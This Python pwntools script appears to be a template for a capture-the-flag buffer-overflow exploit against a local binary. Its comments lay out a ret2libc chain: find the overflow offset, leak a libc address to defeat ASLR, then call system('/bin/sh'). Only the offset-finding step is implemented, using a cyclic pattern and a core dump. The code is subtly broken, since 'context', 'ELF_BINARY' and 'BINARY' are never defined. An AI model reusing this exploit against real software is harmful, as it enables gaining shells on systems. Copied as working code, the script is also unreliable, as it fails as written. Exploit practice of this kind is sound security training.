from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
import resource


## Steps :
# 1) Find the offset of BOF -> (Go to vulnerable input, send cyclic datas, wait for crashing and get back the offset) 
# 2) Find the LIBC version -> (leak a function address, get the LSB of this address, use an external tool to detect the version)
# 3) Calculate offset between remote libc leaked address and useful values (/bin/sh, system)
# 4) Final exploit : BOF -> leak aslr -> calculate offsets -> system(/bin/sh)




#######################
### LOCAL ANALYSIS ####
#######################

LOCAL = True
GDB = False
LOCAL_BIN = "./exploitable"

LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
ENV = {"LD_PRELOAD": LIBC} if LIBC else {}

# Extract static datas
ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets
context.arch = ELF_BINARY.arch
context.binary = BINARY

ARCH_TO_IP = {
    "arm": "pc",
    "aarch64": "pc",
    "mips": "epc",
    "riscv64": "pc",
    "i386": "eip",
    "amd64": "rip"
}


def recv_all_lines(io):
    lines = []
    while True:
        try:
            # Use a small timeout to prevent hanging if the process has ended.
            line = io.recvline(timeout=1)
            if not line:
                break
            lines.append(line)
        except EOFError:
            # End-of-file reached; exit the loop.
            break
        except Exception as e:
            # Optionally log or handle unexpected exceptions.
            print("Error receiving line:", e)
            break
    return lines
def setupEnv():
  # ulimic -c unlimited
  resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
  log.info("[+] Core dump size set to unlimited.")
def localProcessStart():
  io = process(LOCAL_BIN, env=ENV)
  if GDB:
      gdb.attach(io)
  log.info("[+] Local process started.")
  return io
def GoToVulnInput(io = None):
  if not io:
    io = localProcessStart()
  io.recvline()
  io.sendline(b"1")
  io.recvuntil(b"")
  log.info("[+] Reached vulnerable input prompt.")
  return io
def LeaveFromVulnInput(io):
  io.recvline()
  io.sendline(b"")
  recv_all_lines(io)
def findBOFOffset():
  def get_crash_value(core):
    reg = ARCH_TO_IP.get(context.arch)
    if not reg:
        log.error("[!]Unsupported architecture: %s", context.arch)
        return None
    return getattr(core, reg)

  
  setupEnv()
    
  io = localProcessStart()
  io = GoToVulnInput(io)
  
  pattern_length = 520  
  pattern = cyclic(pattern_length)
  log.info(f"[+] Sending cyclic pattern of length {pattern_length} bytes")
  io.sendline(pattern)
  
  #LeaveFromVulnInput(io)
  io.wait()
  log.info("[+] Process crashed, loading core dump")
    
  core = io.corefile
  crash_val = get_crash_value(core)
  
  offset = cyclic_find(crash_val)
  log.info(f"[+] BOF offset found at {offset} bytes")
  
  return offset
  




  





